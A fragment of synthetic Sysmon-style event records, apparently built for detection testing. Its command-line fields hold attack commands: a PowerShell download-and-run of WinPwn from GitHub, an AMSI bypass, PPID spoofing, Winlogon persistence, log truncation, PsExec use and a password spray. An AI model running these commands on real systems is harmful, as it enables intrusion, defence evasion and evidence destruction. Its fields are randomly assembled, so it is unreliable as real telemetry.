        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nSharpCloud -consoleoutput -noninteractive  \",",
        "LogonID": 283702,
        "LogonGuid": "0138e83d-b025-4abd-ac11-59c9f58121ec",
        "SourceProcessID": 4499,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\wall..dll",
        "DestinationProcessID": 4015,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\state..exe",
        "UtcTime": "2024-05-17T01:36:51.588452Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-76.petty-kim.info",
        "User": "sallydavis",
        "ProcessID": 8508,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nmimiload -consoleoutput -noninteractive\",",
        "LogonID": 598996,
        "LogonGuid": "6a89372c-0f1c-4266-bdfa-e51c183c5802",
        "SourceProcessID": 6443,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\food..dll",
        "DestinationProcessID": 7269,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\again..exe",
        "UtcTime": "2024-05-17T01:36:51.588452Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-18.young.com",
        "User": "brittanymontes",
        "ProcessID": 3970,
        "ProcessName": "nc.exe",
        "CommandLine": "\"Compress-Archive -Path \\\"#{input_file}\\\" -DestinationPath #{output_file} -Force\\n\",",
        "LogonID": 281416,
        "LogonGuid": "f5e3d939-8b20-42b7-8da4-9b7aba5bcbfc",
        "SourceProcessID": 1581,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\whom..dll",
        "DestinationProcessID": 9003,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\child..dll",
        "UtcTime": "2024-05-17T01:36:51.589452Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-78.brown.com",
        "User": "moorenancy",
        "ProcessID": 2693,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"mshta vbscript:Execute(\\\"CreateObject(\\\"\\\"Wscript.Shell\\\"\\\").Run \\\"\\\"powershell -noexit -file PathToAtomicsFolder\\\\T1218.005\\\\src\\\\powershell.ps1\\\"\\\":close\\\")\\n\",",
        "LogonID": 622283,
        "LogonGuid": "42f1ebc0-7b2a-48b9-8af7-886d520ac3fe",
        "SourceProcessID": 6998,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\set..dll",
        "DestinationProcessID": 4587,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\yet..dll",
        "UtcTime": "2024-05-17T01:36:51.589452Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-07.graham-harris.info",
        "User": "woodardjames",
        "ProcessID": 9894,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"Import-Module \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\PowerView.ps1\\\"\\nInvoke-ShareFinder #{parameters}\\n\",",
        "LogonID": 357206,
        "LogonGuid": "5021ad43-f973-4d13-b397-77590e85b036",
        "SourceProcessID": 4099,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\result..dll",
        "DestinationProcessID": 4664,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\represent..dll",
        "UtcTime": "2024-05-17T01:36:51.589452Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-78.taylor.org",
        "User": "sarahgarcia",
        "ProcessID": 2203,
        "ProcessName": "malware.exe",
        "CommandLine": "\"at 13:20 /interactive cmd\\n\",",
        "LogonID": 769045,
        "LogonGuid": "727b1ac8-342f-40cb-a204-9e8448af2d3c",
        "SourceProcessID": 5685,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\alone..exe",
        "DestinationProcessID": 4384,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\foreign..dll",
        "UtcTime": "2024-05-17T01:36:51.589452Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-49.webster.com",
        "User": "blairdanielle",
        "ProcessID": 3170,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"cmd.exe /c \\\"wmic \\tcsproduct \\tget UUID\\\" \\ncmd.exe /c \\\"fsutil behavior \\tset SymlinkEvaluation R2L:1\\\" \\ncmd.exe /c \\\"fsutil behavior set \\tSymlinkEvaluation R2R:1\\\"\\nreg    add    HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\LanmanServer\\\\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      \\ncopy \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\PsExec.exe\\\" $env:temp\\ncmd.exe /c \\\"$env:temp\\\\psexec.exe  -accepteula  \\\\\\\\#{targethost} cmd.exe  /c echo \\\"--access-token\\\"\\\"\\n\",",
        "LogonID": 947828,
        "LogonGuid": "0f3975d0-083c-4a85-8feb-a333a92047ee",
        "SourceProcessID": 3079,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\fight..exe",
        "DestinationProcessID": 5313,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\catch..exe",
        "UtcTime": "2024-05-17T01:36:51.590454Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-90.smith.com",
        "User": "johnwinters",
        "ProcessID": 5959,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"Set-PSReadlineOption -HistorySaveStyle SaveNothing\\n\",",
        "LogonID": 113760,
        "LogonGuid": "117b928d-337a-4b32-92c9-0f9350e47f40",
        "SourceProcessID": 7288,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\traditional..dll",
        "DestinationProcessID": 7377,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\who..dll",
        "UtcTime": "2024-05-17T01:36:51.590454Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-41.ferrell.org",
        "User": "rvasquez",
        "ProcessID": 8592,
        "ProcessName": "malware.exe",
        "CommandLine": "\"copy #{exe_to_launch} not_an_scr.scr\\nrundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr\\n\",",
        "LogonID": 403624,
        "LogonGuid": "e1cc4c5d-f8e1-4924-b4f6-74ba63288e4e",
        "SourceProcessID": 1784,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\development..exe",
        "DestinationProcessID": 2851,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\firm..exe",
        "UtcTime": "2024-05-17T01:36:51.590454Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-44.smith.com",
        "User": "rdillon",
        "ProcessID": 8048,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\". \\\"$PathToAtomicsFolder\\\\T1134.004\\\\src\\\\PPID-Spoof.ps1\\\"\\n$ppid=Get-Process #{parent_process_name} | select -expand id\\nPPID-Spoof -ppid $ppid -spawnto \\\"#{spawnto_process_path}\\\" -dllpath \\\"#{dll_path}\\\"\\n\",",
        "LogonID": 917304,
        "LogonGuid": "9d0a61c6-d02e-44cc-8ab8-7872f05bd8d4",
        "SourceProcessID": 2032,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\collection..dll",
        "DestinationProcessID": 4679,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\work..dll",
        "UtcTime": "2024-05-17T01:36:51.590454Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-73.king-sutton.com",
        "User": "robert96",
        "ProcessID": 4842,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"$oldvalue = $(Get-ItemPropertyValue -Path  \\\"HKLM:\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" -Name \\\"Shell\\\");\\nSet-ItemProperty -Path \\\"HKLM:\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" -Name \\\"Shell-backup\\\" -Value \\\"$oldvalue\\\";\\n$newvalue = $oldvalue + \\\", #{payload}\\\";\\nSet-ItemProperty -Path  \\\"HKLM:\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" -Name \\\"Shell\\\" -Value \\\"$newvalue\\\"\\n\",",
        "LogonID": 982760,
        "LogonGuid": "05f87820-16b9-41f2-986c-0dce4f6a25d9",
        "SourceProcessID": 3854,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\network..dll",
        "DestinationProcessID": 5775,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\I..dll",
        "UtcTime": "2024-05-17T01:36:51.590454Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-01.murphy.com",
        "User": "kaylamorales",
        "ProcessID": 1513,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"#{mofcomp_path} \\\"#{mof_file}\\\"\\n\",",
        "LogonID": 325387,
        "LogonGuid": "86013b95-9470-4284-aaba-f869ee31965d",
        "SourceProcessID": 9602,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\according..exe",
        "DestinationProcessID": 5066,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\walk..dll",
        "UtcTime": "2024-05-17T01:36:51.590454Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-65.moreno-nguyen.info",
        "User": "carrillokelly",
        "ProcessID": 7779,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"\\\"#{msxsl_exe}\\\" \\\"#{xmlfile}\\\" \\\"#{xslfile}\\\"\\n\",",
        "LogonID": 658197,
        "LogonGuid": "ebf6014b-bc27-43d5-8e9b-a2b5d2e96328",
        "SourceProcessID": 8546,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\general..dll",
        "DestinationProcessID": 2992,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\lawyer..exe",
        "UtcTime": "2024-05-17T01:36:51.590454Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-35.callahan-castro.com",
        "User": "banksdonald",
        "ProcessID": 7221,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"C:\\\\Windows\\\\System32\\\\inetsrv\\\\appcmd.exe list apppool /@t:*\\nC:\\\\Windows\\\\System32\\\\inetsrv\\\\appcmd.exe list apppool /@text:*\\nC:\\\\Windows\\\\System32\\\\inetsrv\\\\appcmd.exe list apppool /text:*\",",
        "LogonID": 979957,
        "LogonGuid": "355325ef-59ff-4927-b5e7-e70a7c569b85",
        "SourceProcessID": 3170,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\thank..dll",
        "DestinationProcessID": 7892,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\child..exe",
        "UtcTime": "2024-05-17T01:36:51.590454Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-70.hernandez.biz",
        "User": "alexandria80",
        "ProcessID": 6034,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt\\n\",",
        "LogonID": 997713,
        "LogonGuid": "7890373f-5323-41f0-848e-da0cc6a5158a",
        "SourceProcessID": 3065,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\Republican..dll",
        "DestinationProcessID": 8119,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\must..exe",
        "UtcTime": "2024-05-17T01:36:51.592030Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-11.perry.biz",
        "User": "joshua43",
        "ProcessID": 4148,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"Get-Service > $env:TEMP\\\\T1119_1.txt\\nGet-ChildItem Env: > $env:TEMP\\\\T1119_2.txt\\nGet-Process > $env:TEMP\\\\T1119_3.txt\\n\",",
        "LogonID": 661385,
        "LogonGuid": "b51d1bb6-0afa-42c4-a4e4-419c3dbc5dcc",
        "SourceProcessID": 5513,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\her..exe",
        "DestinationProcessID": 1532,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\ability..dll",
        "UtcTime": "2024-05-17T01:36:51.592030Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-53.warren.com",
        "User": "xwoodward",
        "ProcessID": 4309,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"Stop-Service -Name #{service_name}\\nRemove-Service -Name #{service_name}\\n\",",
        "LogonID": 996908,
        "LogonGuid": "0e1e197d-87aa-4aa5-81c3-a5055e69de36",
        "SourceProcessID": 9880,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\child..exe",
        "DestinationProcessID": 6874,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\know..exe",
        "UtcTime": "2024-05-17T01:36:51.592030Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-16.levine.org",
        "User": "bdixon",
        "ProcessID": 6523,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$xml = [System.IO.File]::ReadAllText(\\\"#{xml_path}\\\")\\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \\\"Root\\\\Microsoft\\\\Windows\\\\TaskScheduler\\\" -MethodName \\\"RegisterByXml\\\" -Arguments @{ Force = $true; Xml =$xml; }\\n\",",
        "LogonID": 935255,
        "LogonGuid": "f04c6f3e-8a2e-475d-817f-4a602c01bc64",
        "SourceProcessID": 7046,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\smile..dll",
        "DestinationProcessID": 9327,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\key..dll",
        "UtcTime": "2024-05-17T01:36:51.592030Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-10.maddox.com",
        "User": "alex41",
        "ProcessID": 2310,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"docker container prune -f && sudo truncate -s 0 /var/lib/docker/containers/*/*-json.log\\n\",",
        "LogonID": 461629,
        "LogonGuid": "6d8898c7-3b5a-4848-9055-08eb171fac88",
        "SourceProcessID": 1053,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\from..exe",
        "DestinationProcessID": 5422,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\painting..dll",
        "UtcTime": "2024-05-17T01:36:51.592030Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-77.schultz-taylor.com",
        "User": "ngomez",
        "ProcessID": 3413,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"sudo -l      \\nsudo cat /etc/sudoers\\nsudo vim /etc/sudoers\\n\",",
        "LogonID": 606624,
        "LogonGuid": "44218c8d-4141-453d-9319-37da68416de2",
        "SourceProcessID": 8117,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\finally..exe",
        "DestinationProcessID": 9304,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\cost..exe",
        "UtcTime": "2024-05-17T01:36:51.592980Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-34.lee-johnson.com",
        "User": "morrisonalice",
        "ProcessID": 7283,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"rm -f #{file_to_delete}\\n\",",
        "LogonID": 954899,
        "LogonGuid": "1da51db6-d19b-4508-8fe2-ef6be0e56cfd",
        "SourceProcessID": 5679,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\administration..dll",
        "DestinationProcessID": 3605,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\politics..dll",
        "UtcTime": "2024-05-17T01:36:51.592980Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-37.mahoney.info",
        "User": "hernandezjohn",
        "ProcessID": 8293,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"net view /domain\\nnet view\\n\",",
        "LogonID": 149419,
        "LogonGuid": "23c8855b-1cf8-4e33-b5f0-0cb92d52c23d",
        "SourceProcessID": 5134,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\field..dll",
        "DestinationProcessID": 8542,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\deep..exe",
        "UtcTime": "2024-05-17T01:36:51.592980Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-45.frye-sutton.net",
        "User": "johnsonsandra",
        "ProcessID": 3776,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\ndomainpassspray -consoleoutput -noninteractive -emptypasswords\",",
        "LogonID": 127599,
        "LogonGuid": "f998988c-74ad-4f9d-84dd-457af5460923",
        "SourceProcessID": 4671,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\born..exe",
        "DestinationProcessID": 9751,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\call..exe",
        "UtcTime": "2024-05-17T01:36:51.592980Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-68.butler.net",
        "User": "nguyenmelissa",
        "ProcessID": 2747,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\\n\",",
        "LogonID": 377372,
        "LogonGuid": "578d97ac-ebed-47c2-a2f1-8c2367ab4665",
        "SourceProcessID": 1998,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\image..exe",
        "DestinationProcessID": 9355,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\firm..dll",
        "UtcTime": "2024-05-17T01:36:51.593978Z"
    },
